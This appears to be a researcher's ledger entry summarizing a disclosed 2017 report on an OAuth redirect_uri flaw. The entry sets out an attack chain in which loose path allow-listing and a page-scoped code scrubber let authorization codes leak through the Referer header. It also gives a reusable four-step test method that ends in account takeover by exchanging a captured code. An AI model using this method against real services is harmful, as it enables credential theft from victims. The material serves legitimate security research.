CHAIN: attacker sends the crafted authorize URL with `redirect_uri=<registered host>/<scrub-less path>` (primitive: domain-scope allow-list accepts arbitrary paths) -> victim authenticates; the code lands on a page without the stripping widget and stays in the URL (bypass: the scrubber is page-scoped, not flow-scoped) -> victim clicks any external link and the browser sends `?code=` in `Referer` to the third party (this report's demonstrated impact — the reporter rated it low, verbatim: "attacker can't directly conduct the authentication bypass against victim, in case attacker is not an admin of the one of the external sites") -> the documented escalation endpoint: when the attacker RECEIVES the code (a whitelisted path that renders/loads attacker-controlled content or an attacker-influenced destination — cf. the pixiv chain where the code landed on a same-host attacker page, ledger ~6214), and the client uses plain code flow with no PKCE, the captured code is exchanged for the victim's tokens = account takeover of the OAuth-linked account. Per doctrine §8: preconditions = victim completes the crafted authorize link (+ attacker receipt of the Referer for the full chain); gain = possession of a live authorization code (a bearer credential).
TRANSFERABLE TEST: on any OAuth/OIDC client: (1) mutate `redirect_uri` to arbitrary paths on the registered host (`/1`, `/about/`, `/metadata`) — non-registered paths still receiving `?code=` proves domain-scope allow-listing; (2) on EACH accepted landing page watch the URL after auth — `code` present on some pages and absent on others proves a page-scoped scrubber; (3) click an external link / load an external subresource with a Referer-capturing listener and check for `?code=`; (4) escalate to ATO: find any whitelisted path that reflects or loads attacker content (profile page, markdown field, image proxy, open redirect off the host) and point `redirect_uri` there for direct code capture, then exchange it. Rule: **a code/token scrubber that runs only on the pages the developer remembered is not a mitigation — the redirect_uri allow-list chooses which pages the code can land on, and any scrub-less page turns ordinary Referer egress into credential theft; test the flow's landing paths, not just the callback.**
DEDUPE/DELTA: `292783`, `edoverflow`, `code strips`, `5f45cc999f7812d0b6d2` = 0 hits across the three write targets (`sp1d3rs` 3/2 hits are dedupe-note mentions inside the Vimeo #452559 and Grab 2FA entries — different reports). Related-but-distinct REVIEWED and NOT re-recorded: §17.195 (dot-segment normalization gap in a PATH-PREFIX `redirect_uri` check, code landed on a same-host attacker page and exfiltrated via its analytics — different bypass, different exfil); the Snapchat SSO entry (ledger ~3176 — wildcard-per-domain `referrer` allow-list as ONE link of a `ticket`-theft chain, fragment channel + CSRF login); the pixiv #1861974 entry (ledger ~6214 — code leaked via the redirect page's Google Analytics; the ATO-receipt precedent this chain cites); the code-REPLAY entry (ledger ~7874 — non-consuming exchange handler; lists "referer in narrow conditions" only as a generic leak precondition); the `javascript:`-in-redirect-parameter family (§17.83). NEW DELTA: the PAGE-SCOPED CODE-SCRUBBER BYPASS — the mitigation runs on widget pages only, so the allow-list's loose paths select a scrub-less landing page and Referer carries the authorization code out; recorded as the first link of a documented chain whose endpoint is ATO via code exchange. New general method -> §17.599.
FRESHNESS: submitted / disclosed 2017-11-24 — far outside the preferred 6-12 month window; read because assigned. The mechanism (domain-scope `redirect_uri` + partial scrubbers + Referer egress) recurs in every widget/embedded-login OAuth integration.
